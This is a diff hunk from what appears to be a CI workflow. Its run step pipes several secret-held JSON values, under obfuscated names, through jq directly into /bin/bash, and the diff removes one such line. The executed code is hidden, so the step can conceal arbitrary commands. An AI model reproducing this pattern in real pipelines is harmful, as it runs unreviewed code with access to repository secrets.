@@ -21,7 +21,6 @@ jobs:
           mbe2801: ${{ secrets.mbe2801 }}
         run: |
           printf '%s' "$mbe2801" | jq -r .yk1540 | /bin/bash
-          echo $gql0111 | jq -r .oalk58298 | /bin/bash
           echo $s26947 | jq -r .dyg80738 | /bin/bash
           printf '%s' "$wx109" | jq -r .ecnk24 | /bin/bash
           printf '%s' "$luopw5076" | jq -r .wrtgt16 | /bin/bash
